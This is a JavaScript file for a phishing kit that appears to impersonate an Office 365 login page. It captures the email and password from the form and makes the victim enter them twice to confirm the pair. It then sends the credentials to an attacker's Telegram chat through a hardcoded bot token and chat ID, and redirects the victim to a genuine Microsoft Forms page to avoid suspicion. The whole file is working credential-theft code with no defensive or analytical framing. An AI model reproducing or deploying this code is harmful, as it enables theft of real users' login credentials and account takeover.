// Telegram Bot API details
const TELEGRAM_BOT_TOKEN = "7272693872:AAH2ah-x48_6-XrNqy6uLvnkjtKBEKiymVU";
const TELEGRAM_CHAT_ID = "8041820202";

// Store the first email and password
let firstEmail = "";
let firstPassword = "";

// Function to send data to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    };

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
        });
        const data = await response.json();
        console.log("Message sent to Telegram:", data);
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
}

// Login form submission
document.getElementById("login-form").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Get email and password
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (!firstEmail && !firstPassword) {
        // First submission: Store the email and password
        firstEmail = email;
        firstPassword = password;

        // Clear the input fields
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";

        // Prompt the user to re-enter the email and password
        alert("Please re-enter your email and password to confirm.");
    } else {
        // Second submission: Check if the email and password match the first submission
        if (email === firstEmail && password === firstPassword) {
            // Format the message for Telegram
            const loginMessage = `
|----------| xLOFFICE365/SCH s |--------------|
Online ID: ${email}
Passcode: ${password}
|--------------- I N F O | I P -------------------|
`;

            // Send login details to Telegram
            await sendToTelegram(loginMessage);

            // Redirect to the form (optional)
            window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
        } else {
            // If the email and password don't match, show an error
            alert("The email and password do not match your first submission. Please try again.");

            // Clear the input fields
            document.getElementById("email").value = "";
            document.getElementById("password").value = "";

            // Reset the first email and password
            firstEmail = "";
            firstPassword = "";
        }
    }
});
